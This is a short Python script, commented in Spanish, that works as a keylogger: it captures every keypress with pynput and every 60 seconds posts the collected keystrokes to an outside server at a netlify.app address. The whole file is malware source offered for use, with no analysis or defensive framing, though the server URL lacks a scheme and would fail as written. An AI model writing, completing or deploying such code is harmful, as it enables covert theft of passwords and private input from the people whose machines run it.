from pynput import keyboard
import threading
import requests
import time

# Función para enviar keystrokes a un servidor
def send_keystrokes(keystrokes):
    url = 'davykey.netlify.app'  # Reemplaza con la dirección de tu servidor
    requests.post(url, json={'keystrokes': keystrokes})

# Función para registrar keystrokes
def on_press(key):
    try:
        current_keystrokes.append(key.char)
    except AttributeError:
        current_keystrokes.append(str(key))

# Variable global para almacenar keystrokes
current_keystrokes = []

# Iniciar la escucha de keystrokes
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Función para enviar periódicamente keystrokes al servidor
def periodic_send():
    while True:
        if current_keystrokes:
            send_keystrokes(current_keystrokes)
            current_keystrokes.clear()
        time.sleep(60)  # Enviar cada 60 segundos

# Iniciar el hilo para enviar keystrokes periódicamente
threading.Thread(target=periodic_send).start()